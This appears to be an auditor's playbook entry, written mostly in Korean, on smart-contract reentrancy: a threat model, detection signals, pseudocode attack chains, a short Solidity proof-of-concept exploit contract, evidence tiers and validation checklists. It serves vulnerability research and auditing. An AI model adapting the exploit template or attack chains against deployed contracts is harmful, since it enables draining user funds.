# Scenario: Reentrancy (Cross-function, Read-only, ERC-777/4626)

> 고전 취약점 계보. 단순 `call.value` reentrancy는 대부분 방어되지만
> cross-function / read-only / hook 기반은 지속 발견.

## 1. Threat Model
- **타겟**: Vault, lending pool, staking, vesting, withdraw 로직
- **공격자**: 악성 ERC-777/ERC-4626 토큰 계약 또는 custom receiver 계약 배포 가능
- **Impact**: 자금 이중 인출, 잘못된 reward 계산, invariant 파괴
- **Severity**: High–Critical

## 2. Discovery Signals
- `call.value`, `transfer`, `transferFrom` 이후 state update
- `nonReentrant` modifier 미사용 또는 같은 guard로 연결되지 않은 함수 그룹
- ERC-777 / ERC-677 / ERC-1363 토큰 사용 허용
- ERC-4626 vault의 share 계산에서 `previewXxx` 중간값 사용
- `try/catch` 없는 외부 호출
- View 함수가 중간 상태에서 읽을 수 있는 값 반환

## 3. Exploit Chain

### 3.1 Cross-function
```
function withdraw() { send(ETH); balance[msg.sender]=0; }
function deposit() { balance[msg.sender]+=amount; }

// 공격자 receiver: fallback 중 deposit() 호출
// → deposit이 guard와 무관 → balance 재증가 후 withdraw 종료
```

### 3.2 Read-only
```
function withdraw() {
    // 중간에 LP supply 변경된 상태
    externalCall(to_attacker);
}
// 공격자 fallback에서 view 함수 getLpPrice() 호출 → inflated
// 즉시 다른 프로토콜에서 그 getLpPrice()로 borrow (같은 트랜잭션)
```

### 3.3 ERC-777 hook
```
// 토큰 전송 시 _beforeTokenTransfer / tokensReceived 자동 호출
// 공격자 ERC-777: tokensReceived에서 victim.withdraw 재호출
```

### 3.4 ERC-4626 donation
```
// vault empty 상태에서 1 wei deposit → share=1
// 직후 vault에 대량 direct transfer (donation)
// → 다음 사용자 deposit이 truncation으로 0 share 받음 (first depositor attack)
```

## 4. PoC Template
```solidity
contract Exploit {
    IVictim victim;
    bool once;

    receive() external payable {
        if (!once) { once = true; victim.withdraw(); }
    }

    function attack() external {
        victim.deposit{value: 1 ether}();
        victim.withdraw();  // triggers receive
    }
}
```

## 5. Evidence Tier
- **E1**: fork 테스트에서 이중 인출 금액 assertion (on-chain read)
- **E2**: PoC tx 성공하지만 금액 작음 (< $1K)
- **E3**: 코드 패턴만 식별

## 6. Gate 1 / Gate 2
- [ ] CEI (Checks-Effects-Interactions) 위반인가?
- [ ] `nonReentrant`가 동일 guard를 공유하는 함수 그룹을 커버?
- [ ] ERC-777 등 hook 토큰이 실제로 허용/등록되어 있나?
- [ ] read-only reentrancy는 외부 consumer가 해당 view를 사용해야 impact 있음 (체인 증명 필요)

## 7. Variants
- Cross-contract reentrancy (같은 owner의 여러 vault)
- Gas-based reentrancy (63/64 rule 악용)
- `delegatecall` 기반 reentrancy (storage layout overlap)
- Multichain reentrancy — 메시지 브리지 콜백 경로

## 8. References
- DAO 2016 (고전)
- Cream Finance 2021
- Sushi MISO 2021 (auctionLaunch)
- Penpie 2024 (custom market)
- Curve Vyper 0.2.x (2023) — read-only reentrancy 계열
- `knowledge/techniques/defi_hacks_2025_2026.md` 섹션 2.3
